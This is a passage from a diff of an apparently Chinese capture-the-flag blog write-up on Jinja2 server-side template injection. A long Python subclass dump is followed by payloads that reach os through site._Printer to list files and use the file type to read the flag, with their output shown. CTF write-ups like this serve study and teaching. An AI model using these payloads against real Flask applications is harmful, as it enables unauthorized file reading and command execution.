class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.timedelta&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.time&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;datetime.tzinfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._Missing&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug._internal._DictAccessorProperty&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ViewItems&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures._omd_bucket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Headers&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.IfRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.Range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.ContentRange&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.datastructures.FileStorage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;email.LazyImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;calendar.Calendar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.urls.Href&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.utils.HTMLBuilder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.ClosingIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi.FileWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wsgi._RangeWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.FormDataParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.formparser.MultiPartParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.exceptions.Aborter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;uuid.UUID&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;CArgObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CThunkObject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes._CData&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.CField&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ctypes.DictRemover&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.CDLL&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ctypes.LibraryLoader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;select.epoll&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous._json._CompactJSON&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.signer.Signer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.serializer.Serializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask._compat._DeprecatedBool&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.Local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
 
 <p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
 <p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>回显</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found<br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>
 
 <p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctf</span>&#123;f22b6844-<span class="number">5169</span>-<span class="number">4054</span>-b2a0-d95b9361cb57&#125;</span><br></pre></td></tr></table></figure>
 
 
 
